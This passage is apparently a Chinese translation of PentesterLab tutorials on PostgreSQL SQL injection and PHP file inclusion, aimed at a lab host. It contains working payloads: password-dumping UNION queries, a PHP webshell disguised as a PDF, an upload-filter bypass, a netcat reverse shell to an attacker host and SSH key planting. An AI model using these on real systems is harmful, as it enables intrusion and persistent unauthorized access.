,注入内容 1 UNION SELECT 1 将返回一个错误因为查询语句的两个子部分的列数是不同的； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2 ，因为如上同样的原因，注入内容 1 UNION SELECT 1,2 会返回一个错误； SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3 ，因为两个子部分拥有相同的列数，这个语句将抛出一个不同的错误信息。 如下： 1Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched 另一种方法是利用关键字 ORDER BY 。类似于“From SQL Injection to Shell”中的使用方式。唯一的区别是由应用程序返回的错误消息： 1Warning: pg_exec(): Query failed: ERROR: ORDER BY position 10 is not in select list 检索信息现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 PostgreSQL 。 相比于MySQL，PostgreSQL多需要一步使得到的 UNION 语句正常工作：列需要的两个查询必须是由第一个查询决定类型之间的同类型。如果我们使用之前发现的语句 1 UNION SELECT 1,2,3,4 ，可以看到下面的错误信息显示： 1Warning: pg_exec(): Query failed: ERROR: UNION types character varying and integer cannot be matched 为了避免这个错误，我们可以用 null,null,null,null 来代替 1,2,3,4 ，不会产生任何错误。现在我们可以找出哪些列是一个字符串（因为大多数的我们想要的信息将基于字符串并且很容易转换任何值为字符串）。要做到这一点，我们只需要尝试每一列一个接一个相互，看看哪一个不返回一个错误： 1 UNION SELECT &#39;aaaa&#39;,null,null,null ：该测试返回消息：invalid input syntax for integer ，这可能是一个整数列。 1 UNION SELECT null,&#39;aaaa&#39;,null,null ：不返回一个错误，我们可以使用这一列，我们可以在页面中看到字符串 aaaa。 1 union select null,null,&#39;aaaa&#39;,null ：不返回一个错误，我们可以用这一列，结果是不可见的在网页中，在页面的源中可见（在 &lt;img 标签中）。 1 union select null,null,null,&#39;aaaa&#39; ：该测试返回消息：invalid input syntax for integer ，这可能是一个整数列。 利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息： 用PHP应用程序连接到数据库的用户使用 current_user 数据库版本使用 version() 例如你可以访问以下URL获取这些信息： 数据库版本：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,version(),null,null 当前用户：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_user,null,null 当前数据库：http://vulnerable/cat.php?id=1%20UNION%20SELECT%20null,current_database(),null,null 我们现在能够从数据库中检索信息和检索任意内容。为了获取当前应用程序相关的信息，我们需要： 当前数据库中的所有表的名称 我们要从中检索信息的表的列名 PostgreSQL提供了包含有关数据库、表、列的元信息表。我们将使用这些表来获取我们需要的信息来构造最终请求。 以下查询可用于检索： 所有表的列表：SELECT tablename FROM pg_tables 所有列的列表：SELECT column_name FROM information_schema.columns 通过混合这些查询和以前的URL，你能猜出信息检索的访问链接： 表的列表：1 UNION SELECT null,tablename,null,null FROM pg_tables 列的列表：1 UNION SELECT null,column_name,null,null FROM information_schema.columns 问题是，这些请求，为您提供一个所有的表和列的原列表，但查询数据库和检索感兴趣的信息，你需要知道什么列是属于什么表。幸好，information_schema.columns stores表中存储有表名： 1SELECT table_name,column_name FROM information_schema.columns 要获取这些信息，我们可以： 把表名和列名放在不同的注入位置：1 UNION SELECT null, table_name, column_name,null,null FROM information_schema.columns 把表名和列名放在同一个注入位置，使用级联符号（||）分隔：1 UNION SELECT null,table_name||&#39;:&#39;|| column_name,null,null FROM information_schema.columns 。：可以很容易的分割查询结果。 利用这些信息，你现在可以创建一个查询，从表中检索信息： 11 UNION SELECT null,login||':'||password,null,null FROM users; 然后获取用户名和密码用来访问管理页面。 该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user)…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。 破解密码使用在”From SQLInjection to Shell“中描述的方法可以很容易破解密码。 上传webshell并且执行代码传统的webshell一旦进入管理页面，下一个目标是找到一种方法，在操作系统上执行命令。 我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器将给我们一种方式来运行PHP代码和命令。 首先我们需要创建一个PHP脚本来运行命令。下面是一个简单的和最小的webshell的源代码： 123&lt;?php system($_GET['cmd']);?&gt; 这个脚本获取参数cmd的内容并且执行它。它需要被保存为一个.php扩展名的文件，例如shell.php可以被用作文件名。 我们现在可以使用在网页的上传功能：http://vulnerable/admin/new.php尝试上传这个脚本。 我们可以看到，脚本没有被正确上传到服务器上。应用阻止文件扩展名.php上传。我们可以尝试.php3，.php.test……不幸的是这些名字都不工作。 我们需要找到另一种方式来获得命令的执行。 .htaccess介绍.htaccess是用来执行每次修改Apache配置。他们可以是非常危险的如果你可以上传一个并且得到由服务器解释。 获取命令执行的最常见的方式是有一个任意的扩展处理程序： 1AddType application/x-httpd-php .blah 这一行将告诉Apache的解释.blan文件使用PHP引擎。因为.blan文件看起来不像被应用程序过滤。 这个工作了因为 AllowOverride被设置为All（它的默认值），这意味着如果服务器遇到.htaccess文件将解释它。 一旦我们上传了包含以上内容的.htaccess文件。我们现在可以重命名文件 shell.php 到 shell.blan 然后上传它。 一旦这两个文件上传，我们可以得到命令的执行 获得代码执行现在，我们需要找到我们的脚本，管理上传放在Web服务器上的文件。我们需要确保该文件是直接可用的Web客户端。我们可以参观新上传的图像的网页，看到 img 标记指向： 123456789&lt;div class&#x3D;&quot;content&quot;&gt; &lt;h2 class&#x3D;&quot;title&quot;&gt;Last picture: Test shell&lt;&#x2F;h2&gt; &lt;div class&#x3D;&quot;inner&quot; align&#x3D;&quot;center&quot;&gt; &lt;p&gt; &lt;img src&#x3D;&quot;admin&#x2F;uploads&#x2F;shell.blah&quot; alt&#x3D;&quot;Test shell&quot; &#x2F;&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; 你现在可以访问页面在以下地址并且运行命令使用cmd参数。例如：访问http://vulnerable/admin/uploads/shell.blah?cmd=uname将运行命令 uname 在操作系统上并且返回当前系统内核（Linux）。 其他命令可以用来获取更多信息： cat /etc/passwd 来获得系统的完整的用户列表； uname -a 来获得当前内核版本； ls 来获得当前目录内容； … 像以前一样，我们的webshell具有和Web服务器上运行PHP脚本相同的权限，例如你不可以检索文件 /etc/shadow 的内容因为Web服务器没有访问此文件的权限（但你还是应尽可能尝试假设管理员错误地修改了权限）。 每个命令都是运行在一个全新的上下文独立的前面的命令，你将无法通过运行 cd /etc 和 ls 得到 /etc/ 目录的内容，因为第二命令将在一个新的上下文。获取目录 /etc/ 内容，您将需要运行ls /etc/。 总结这次练习教你如何手动检测和利用SQL注入PostgreSQL数据库访问到管理页面。一旦在“信任区”，更多的功能通常是可用的，将可能会导致更多的漏洞。这是基于一个几年前一个网站进行渗透测试的结果，但这类漏洞的网站今天仍在互联网存在。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pentesterlab","slug":"Pentesterlab","permalink":"https://darkwing.moe/tags/Pentesterlab/"}]},{"title":"PHP Include And Post Exploitation","slug":"PHP-Include-And-Post-Exploitation","date":"2015-03-26T07:29:04.000Z","updated":"2019-09-03T07:30:50.763Z","comments":true,"path":"2015/03/26/PHP-Include-And-Post-Exploitation/","link":"","permalink":"https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/","excerpt":"","text":"简介本课程详细讲解了发现和利用一个有限制的环境中的PHP漏洞。然后介绍了post漏洞利用的基础，shell，反向shell和TCP重定向。 攻击分为三个步骤： 指纹识别：收集Web应用使用的技术信息。 检测和利用PHP包含漏洞：在这一部分中，您将学习PHP包含漏洞的工作原理以及如何利用它来获取代码执行。 Post漏洞利用：访问操作系统，获得shell并且执行TCP重定向到其他服务。 指纹识别指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。 检查HTTP标头大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取： 1$ telnet vulnerable 80 PS： vulnerable是主机名或服务器的IP地址； 80是由Web应用程序使用的TCP端口（80是HTTP默认值）。 通过发送以下HTTP请求： 12GET / HTTP/1.1Host: vulnerable 它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头： 12345678910HTTP/1.1 200 OKDate: Tue, 10 Apr 2012 04:24:16 GMTServer: Apache/2.2.16 (Debian)X-Powered-By: PHP/5.3.2Vary: Accept-EncodingContent-Length: 2065Content-Type: text/html&lt;html&gt; &lt;head&gt; 这里的应用程序通过HTTP。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用 openssl 工具： 1$ openssl s_client -connect vulnerable:443 PS： vulnerable是主机名或服务器的IP地址； 443是由Web应用程序使用的TCP端口（443是HTTPS的默认值） 使用应用程序如Burp Suite（http://portswigger.net/）设置为代理可以很容易地获取相同的信息。 使用NiktoNikto工具（http://cirt.net/nikto2）可用于收集远程服务器上的信息。Nikto检查已知的漏洞路径并且检查HTTP标头。这是一个特别有用的工具，在旧系统中找到漏洞（Lotus Domino, IIS4, …）。下面的命令可以执行扫描远程服务器： 1234567891011121314151617181920212223242526$ perl nikto.pl -h http://vulnerable/- Nikto v2.1.4---------------------------------------------------------------------------+ Target IP: 192.168.0.21+ Target Hostname: vulnerable+ Target Port: 80+ Start Time: 2012-04-11 14:12:45---------------------------------------------------------------------------+ Server: Apache/2.2.16 (Debian)+ Retrieved x-powered-by header: PHP/5.3.2+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.+ /index.php?page=../../../../../../../../../../etc/passwd: PHP include error may indicate local or remote file inclusion is possible.+ /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.+ OSVDB-3126: /submit?setoption=q&amp;option=allowed_ips&amp;value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-3092: /login/: This might be interesting...+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3268: /images/: Directory indexing found.+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ 4103 items checked: 0 error(s) and 13 item(s) reported on remote host+ End Time: 2012-04-11 14:13:01 (16 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 我们可以看到Nikto找到了一些问题： Apache和PHP版本； 一个潜在的PHP包含问题； 假积极性（OSVDB-3126）； PHP的复活节彩蛋是可用，PHP配置 exposed_php 开启状态（OSVDB-12184）； 一些目录可以索引； 登陆页。 检测和利用 PHP 文件包含漏洞PHP文件包含漏洞介绍之前，开发者使用服务器端包含来复制在许多网页中相同的信息，保持在只有一个地方（避免代码重复和耗时的更新）。当开发人员开始使用PHP，他们开始使用PHP函数 include 和 require （部分较聪明的使用 include_once 和 require_once ）执行同样的事情。该代码是包含到当前页面并且解释作为它的一部分。 只要人们使用一个恒定的路径在 include 或 require 中，没有任何安全的隐患。然而，一些开发者在这里使用了在用户的控制下的路径。这可能导致文件包含。如果有人可以决定哪些文件被包含和解释，他可以通过控制他的文件并且强制服务器解释任意代码。 如果，你在执行代码审查，脆弱的PHP代码看起来类似于这种： 1234&lt;?phpinclude(\"header.php\");include($_GET[\"page\"]);?&gt; 第一行用于包括header.php并不脆弱因为第一行的值header.php不是由用户控制。 然而，在第二行，由用户提供的值（$_GET[“page”]）是直接使用，没有任何过滤或预处理。这是一个典型的文件包含。 有两种典型的文件包含： 本地文件包含， 远程文件包含。 他们都来自同一个问题（使用用户的输入包含一个文件），唯一的区别是他们可以利用的途径。一个远程文件包含可以通过使用任何资源来利用，而本地文件包含只能使用本地资源来利用。 PHP文件包含检测本地文件包含的检测类似于目录遍历，因为我们是在玩一个路径。我们知道，PHP脚本使用用户提供的值并且使用它作为一个包含文件的路径，但是所提供的值可以通过PHP代码修改： 父目录可以添加：include(“includes/“.$_GET[“page”]); ； 文件扩展名可以添加：include($_GET[“page”].”.php”); ； 值可以被净化：include(basename($_GET[“page”])); ； 之前所有的操作都可以执行：include(“includes/“.basename($_GET[“page”]).”.php”); 。 这些修改将修改这一问题的检测和利用。 PHP提供了对远程文件的保护包括（allowurlinclude 在PHP配置文件中）。这种配置也会修改Web应用中检测和利用PHP文件包含的行为。 最简单的方法是测试包含路径，将生成错误消息。 你可以先尝试包含一个不存在的文件：例如 pentesterlab123randomvalue 是不可能存在的；；你可以用它来看看有什么消息被应用程序发送回来。我们可以看到下面的错误消息被抛出： 123&lt;b&gt;Warning&lt;&#x2F;b&gt;: include(pentesterlab123randomvalue.php) [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt; &lt;b&gt;Warning&lt;&#x2F;b&gt;: include() [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: Failed opening &#39;pentesterlab123randomvalue.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; 这个错误信息给了我们需要在漏洞利用时使用的重要信息： 1Failed opening &#39;pentesterlab123randomvalue.php&#39; for inclusion 由于我们使用的字符串 pentesterlab123randomvalue ，我们可以猜测后缀名 .php 是被PHP代码添加的。 我们可以尝试访问一个没有权限的文件：例如访问 /etc/shadow 将有可能因为当前网络服务器的用户没有权限而产生一个异常。然而，由于PHP代码添加了后缀名 .php ，我们需要添加一个空字节（编码为 %00 ）来绕过它并且访问页面 http://vulnerable/index.php?page=../../../../../etc/shadow%00。你可以使用很多 ../向上访问文件系统中的 shadow文件。下面的错误信息显示： 1&lt;b&gt;Warning&lt;/b&gt;: include(../../../../../etc/shadow) [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: failed to open stream: Permission denied in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; 我们可以看到，我们有一个不同的错误信息：Permission denied 并且我们的空字节技巧生效了，因为PHP尝试包含文件../../../../../etc/shadow 。 你可以尝试用文件 /etc/passwd 使用同样的把戏（../ 和空字节），你应该能访问到文件内容： 你可以修改请求的值从字符串到数组；这可能会影响到PHP的行为。例如，修改参数 page=login 到 page[]=login ，下面的错误信息被抛出： 12&lt;b&gt;Warning&lt;&#x2F;b&gt;: include(Array.php) [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt;&lt;b&gt;Warning&lt;&#x2F;b&gt;: include() [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: Failed opening &#39;Array.php&#39; for inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; 我们可以看到，提供的值已经被改变成了数组因为PHP将它作为一个字符串转换了。 检查的另一种方法是使用不同的值观构建相同的路径。例如，以下路径：classes/../login ，./login 和 login 匹配相同的文件。Windows和Unix目前对于路径管理的主要区别，假如你尝试访问 classes/../login 并且存储库类不存在，Linux/Unix将抛出一个错误，而Windows将忽略这个问题，显示正确的页面。 你可以使用另一个Web服务器测试远程文件访问，然而，它只会工作在以下情况下： 如果PHP配置允许远程文件包含； 如果Web服务器访问远程服务器可以被防火墙阻止，缺少DNS解析（可以使用IP地址来绕过），通过Web代理服务器或通过网络（例如，你的测试环境中没有互联网接入）。 例如，你可以访问以下URL尝试包含谷歌主页：http://vulnerable/index.php?page=http://www.google.com/? URL末尾的？用来确保任何添加到URL的扩展或后缀将被谷歌的服务器解释为一个参数。脆弱的系统没有配置允许远程文件包含，显示如下错误信息： 12345&lt;br /&gt; &lt;b&gt;Warning&lt;/b&gt;: include() [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: URL file-access is disabled in the server configuration in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: include(http://www.google.com/?.php) [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: failed to open stream: no suitable wrapper could be found in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; &lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: include() [&lt;a href='function.include'&gt;function.include&lt;/a&gt;]: Failed opening 'http://www.google.com/?.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in &lt;b&gt;/var/www/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt; 如果PHP配置允许远程包含，这是一个例子，我们看到了什么： 我们可以看到“正常”的页面并且谷歌网页已经被包含进来了。 从这个测试中，我们可以猜出： 有一个本地文件包含漏洞； 一个.php扩展被添加到提交的值后面。 PHP文件包含利用与SQL注入（盲注和非盲注）类似，你可以首先尝试包括远程文件，如果它不工作，你需要使用一个本地文件包含。 远程文件包含利用利用远程文件包含，你只需要安装一个Web服务器来运行你的PHP代码。PHP代码是一个简单的webshell： 123&lt;?php system($_GET[\"cmd\"]);?&gt; 你需要使用一个不会被你的服务器解析成PHP文件的扩展名来保存这个文件来确保脆弱的服务器收到的是PHP代码而不是PHP代码的执行结果。例如你可以使用扩展名： .txt 。然后你可以包含文件并指定要运行的命令去访问页面：http://vulnerable/index.php?page=http://yourserver/webshell.txt&amp;cmd=ifconfig 如果你访问这个页面（配置允许远程文件包含），下面的步骤会发生： PHP脚本将检索文件 webshell.txt ； PHP脚本将开始解释代码； PHP脚本将使用URL中所提供的cmd的值（注：值是提供给脆弱的服务器不是你的服务器）； 提供的命令将被执行； 服务器将发送回命令的结果。 正如我们之前所说的，脆弱的系统是不存在远程文件包含，这种方法不会在当前的设置下工作。 本地文件包含利用有很多方法可以利用一个本地文件包含，它们都是基于相同的方法：你需要找到一个办法把PHP代码放入在系统上的文件，然后包含代码。 可以使用下列方法： 在日志中注入PHP代码：例如，一个Web服务器，通过访问的URL（路径包含PHP代码），然后包含Web服务器的日志。 在一封电子邮件中注入PHP代码，通过发送电子邮件，然后包括电子邮件（在`/var/spool/mai）。 上传一个文件，包含它，例如你可以上传一个图像并把你的PHP代码写在图像的注释部分（因此不会修改图像大小）。 上传PHP代码通过另一个服务：FTP，NFS，… … 注入到日志应该是你最后的解决方案，如果你没有正确地使用PHP语法（正确的PHP代码和正确的HTTP编码）在第一次尝试，你将不得不等待日志替换。 在这里我们可以看到，该应用程序允许用户上传一个介绍为“征文”。我们将使用此功能来上传我们的PHP代码。 为了测试这个上传功能，我们需要检查： 可以上传的文件扩展名； 可以上传的内容类型。 检查扩展可以很容易地通过重命名PDF文件到一个PHP文件做尝试上传。如果文件扩展名的PDF文件是可接受的，很可能是没有控制文件扩展名。 一些PHP开发者的信任值由HTTP协议在多部分消息，只检查值为$_FILES[&#39;file&#39;][&#39;type&#39;]。这个值是由客户端控制，可以使用代理服务器很容易修改。 对于内容类型，我们只需要工作在其他方式，我们可以创建一个txt文件，重命名为file.pdf。如果应用程序接收文件，则没有过滤内容类型。 在这里我们可以看到，通过之前的方法测试，扩展名和内容类型都被上传脚本检查。 利用这个问题，我们将需要一个有效的PDF文件包含PHP代码。 我们可以使用下列方法之一： 采取任何PDF并且增加我们的PHP的有效载荷； 创建一个PHP文件看起来像一个PDF，并将绕过内容类型检查。 第一种方法可能会造成一些问题取决于文件内容（因为有些字符不能正确支持在包含中）和可能不工作。第二种方法是安全的，为什么我们要用它。 如果你打开一个PDF文件，你可以看到第一行看起来像： 12$ head -n 1 sample.pdf%PDF-1.4 如果你使用函数 mime_content_type （大部分PHP开发者用它来检查文件类型），你可以看到，只有以下需要： % pdf-1.4 （或不同的版本）。 基于这些信息，我们可以创造我们的假PDF文件： 1234%PDF-1.4&lt;?php system($_GET[\"cmd\"]);?&gt; 然后使用PDF扩展名命名它（例如 lfi.pdf ）。如果你的PHP安装在您的系统（命令行解释器），您可以快速检查文件是否被认为是一个PDF通过使用下面的代码： 123&lt;?phpecho mime_content_type('lfi.pdf') . \"\\n\";?&gt; 然后运行它： 12$ php content-type.phpapplication/pdf 我们现在有一个有效的PDF包含PHP的有效载荷。 一旦我们把我们的文件上传，我们需要包含它，为了得到这方面的信息，可以登录电子邮件和密码设置，看到有一个链接到我们上传的文件。 我们已经知道了文件被上传，我们可以包含它。然而，我们需要有一个空字节来摆脱被合法的PHP代码添加的扩展名。PHP 5.3.4之后不能使用零字节的技巧摆脱扩展名做本地文件包含。我们可以访问以下页面获取命令执行：http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=uname 注： page参数是我们上传的文件名，添加一个空字节； cmd是我们要运行的命令。 我们可以在包含文件页面看到PDF-和命令的结果： 1%PDF- Linux Shell与反向Shell后续利用介绍后续利用允许你更好的访问系统。有一个webshell是第一步，然而，对于每个命令你将需要发送一个HTTP请求并等待结果。此外，如果你试着用 cd .. 移动到父目录，你会看到下一个命令仍将运行在相同的目录：每个请求都是完全独立于前一个。 为了绕过这些限制，我们将需要得到一个“真正”的shell在远程操作系统上。 Shell与反向Shell有两种方法得到远程服务器上的shell，你可以获得命令执行： 使用shell：你将绑定一个shell到一个TCP端口（step1）。然后你就可以连接它运行命令（step2）。 使用反向shell：你可以在你的本地系统绑定一个端口（step1），在服务器端连接到这个端口并且重定向输入和输出到一个shell。然后你就可以运行命令。 在大多数系统（包括脆弱的系统），你将能够绑定一个端口（只要你选择1024的端口，因为这是一个Unix系统），但是很可能你将无法访问它（因为你和易受攻击的服务器之间的防火墙）。这就是为什么大多数的时间，绑定shell到端口不能解决问题。 因为防火墙更容易过滤入站流量相比于出站流量，这是更可能是一个反向shell正常工作。此外，您可以使用特权端口（如TCP／80或TCP／443）只要你在系统中有充分的权限。 使用反向shell连接我们需要确保netcat在双方系统都是可用的。 在您的本地系统，你可以很容易地安装它，因为你有充分的机会。根据你的操作系统，你将需要： 从Nmap项目中安装ncat（http://nmap.org/ncat/）如果你使用Windows。 从Nmap项目中安装ncat（http://nmap.org/download.html#macosx）如果你使用Mac OS。 在Fedora中安装nmap并且使用 ncat 。 在Debian中安装nmap并且使用 netcat 。 有不同版本的netcat存在并且其中一些不支持 -e参数。确保你使用的版本支持此参数。 在远程服务器上已经安装有netcat。如果没有，你可以使用下面的方法： 添加 %PDF-1.4 到文件第一行并且使用合法的上传脚本； 使用wget从远程服务器下载。 对于这两种方法，您将需要有一个版本的nc针对目标操作系统的体系结构编译（最有可能是一个静态二进制文件）。 对于第一种方法，如果你是一个Unix系统（Linux，Mac或*BSD），你可以： 添加一个PDF文件头： 12$ echo \"%PDF-\" &gt; pdfheader$ cat pdfheader nc &gt; nc.pdf 上传你创建的服务器文件。从文件中提取二进制文件使用文件包含漏洞： 1$ tail -n +2 nc.pdf &gt; nc 对于第二种方法，你只需要下载nc从远程服务器使用包含漏洞。 在被感染的系统上运行命令，我们将使用本地文件包含漏洞。我们需要遵循这些步骤： 在本地操作系统使用netcat绑定一个端口（nc或netcat，取决于你的系统）： 1$ sudo nc -l -p 80 使用我们的webshell运行netcat影响服务器通过访问以下URL：（http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=nc%20attacker%2080%20-e%20/bin/bash）对应的命令： 1$ nc attacker 80 -e /bin/bash attacker是你的Ip地址。 使用sudo（或root权限）允许我们绑定80端口，该端口不能被视为一个普通用户。端口80（HTTP）是不太可能被封锁。以下端口也可以尝试：21，53，443。 然后你可以运行命令（uname或id为例）在本地的nc： 12345$ sudo nc -l -p 80unameLinuxiduid=33(www-data) gid=33(www-data) groups=33(www-data) 通过socat进行TCP重定向我们现在有一个shell，但它会变得更好如果有一个真正的shell（比如支持Ctrl-C），可以轻松地复制和检索文件例如使用SSH。 要做到这一点，我们需要使用socat（http://www.dest-unreach.org/socat/）。socat可能是日常系统管理和入侵的最有用的网络工具之一。 你可以找到一些Windows版本在互联网上，但它可能是更好的使用你自己编译的版本，或者你使用一个虚拟Linux系统。 因为这个脆弱的系统是防火墙，我们将使用一个反向连接告诉socat重定向所有流量从我们的系统到一个本地端口。 在这个例子中，我们将尝试访问本地SSH服务器上可用的端口22，使用重定向到我们在本地系统的2222端口。下面的图显示了两个系统之间的网络流： 正如你所看到的，唯一需要的权限在攻击者的一面，允许我们使用这种技术通过低特权帐户。 首先，我们需要把我们的本地端口2222（我们将在之后访问）和将访问的脆弱的服务器端口（端口443来避免防火墙，因为80端口已经被使用）绑定起来： 1attacker $ sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 443端口需要在第一个位置，因为它是脆弱的服务器将尝试连接到的端口。限制访问本地端口，不允许任何人在我们的网络访问端口443和服务器上的远程端口重定向，选项可以使用绑定范围。 在远程服务器上，我们需要做到以下几点： 1vulnerable $ while true; do socat TCP4:attacker:443 TCP4:127.0.0.1:22 ; done attacker 是你的IP地址。 别忘了杀掉循环当你不需要重定向的时候。 我们可以尝试SSH到远程系统： 1attacker $ ssh localhost -p 2222 然而，我们无法连接，因为我们不知道 www-data 的密码。 要获得SSH访问，我们将需要设置一个远程服务器上的SSH密钥。 1attacker $ ssh-keygen -P \"\" -f vulnerable 注： -P 表示一个空的密码； -f 表示文件名。 两个文件将被创建：vulnerable 和 vulnerable.pub 我们可以使用前面上传netcat（或任意文件）的方法之一来上传公钥文件到脆弱的系统上。为此，我们需要停止socat和netcat。因为公钥文件不是二进制文件，我们只能通过一个新的netcat的shell把文件复制过去。你需要重新运行一个监听netcat在端口80（sudo ncat -l -p 80）然后你可以上传公钥文件。 1234567attacker $ sudo ncat -l -p 80iduid=33(www-data) gid=33(www-data) groups=33(www-data)grep www-data /etc/passwdwww-data:x:33:33:www-data:/var/www:/bin/shmkdir ~www-data/.sshecho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzERqIb6v4mbrkV6xdlqsDMo/sBy3sA9SMOpBJI6DRHmy9Y6ilSlv7UGHzg9dDOhqxis/RVcGBQP2eceNOUvBY24yRD8R31p73AilUwhdvRm8XhRszaXciskSBTjLQMY9Iw8poDNZFZZqIkhWq6ZMIUdv0PfVouC0UXJBYq3AQIJLKSlJSy/DyrORUY7kLf5h3oyk1KlWGKdZ1duZeYwz7Qc2kHHw3TpsckhyS0VaeZ6V3Rk4pNVIaUxOCENP+hNDWQWpkvPKXPjvr4tYS1kzs+TVi79z76yV61KmwZDLwPse3DBUSXakCSDoPI20C2SIGWjqI7QrjtM/SQe19N8f9 attacker\" &gt;&gt; ~/.ssh/authorized_keys 现在，一切工作正常，我们可以重新启动socat的进程。（注：重启本地socat并且重新运行在脆弱的系统上的socat命令）并且连接到之前socat创建的连接。 12345678910attacker $ ssh localhost -p 2222 -l www-data -i vulnerable Linux debian 2.6.32-5-amd64 #1 SMP Thu Mar 22 17:26:33 UTC 2012 x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.$ 注： -p 2222 是通过SSH转发的端口； -l www-data 表明我们将要使用的用户的名称（可以使用netcat的shell的命令id得到这个值）； -i vulnerable 是私钥文件。 一旦我们有了SSH访问远程服务器，现在我们可以很容易地使用SSH进行端口重定向，例如访问本地MySQL服务器。 1attacker $ ssh localhost -p 2222 -l www-data -i vulnerable -L 13306:localhost:3306 然后你可以检查您使用SSH重定向访问的MySQL（在您的本地系统）：MySQL客户端： 1attacker $ mysql -h localhost -u root -P 13306 telnet去看MySQL服务端的banner： 1attacker $ telnet localhost 13306 SSH允许我们使用其他工具如sshfs挂载影响服务器的文件系统，或使用这个服务器作为socks代理访问其他内部服务器（使用 ssh -D）或运行X11应用。 DNS隧道不幸的是，一个简单的虚拟系统不提供我们的架构设置这种喷出方法，但最好要知道它能做的这些。 当入站和出站流量完全过滤，你仍然可以使用DNS隧道（如果DNS请求“互联网”是允许的）。可以使用的工具 dns2tcp 。 下面的图表说明了DNS隧道工作情况： 让我们说，客户想发送字符串AAAA到服务器，它将发送一个DNS请求到 aaaa.pentesterlab.com ，此DNS请求将被转发到客户端的DNS服务器和所有的服务器，直到达到DNS服务器 pentesterlab.com 。这样的字符串AAAA已通过所有的DNS服务器到服务器。然后服务器要返回字符串 BBBB 到客户端，它将使用合法的DNS响应并且信息将向客户传递后被所有DNS服务器发送请求时使用。 DNS隧道是绕过安全限制的最热点的一种简易方法。 在这里，被入侵的系统将作为dns2tcp客户端，它会发送一个请求来检索它需要运行的命令，一旦收到响应，它会运行命令并发送结果到服务器。 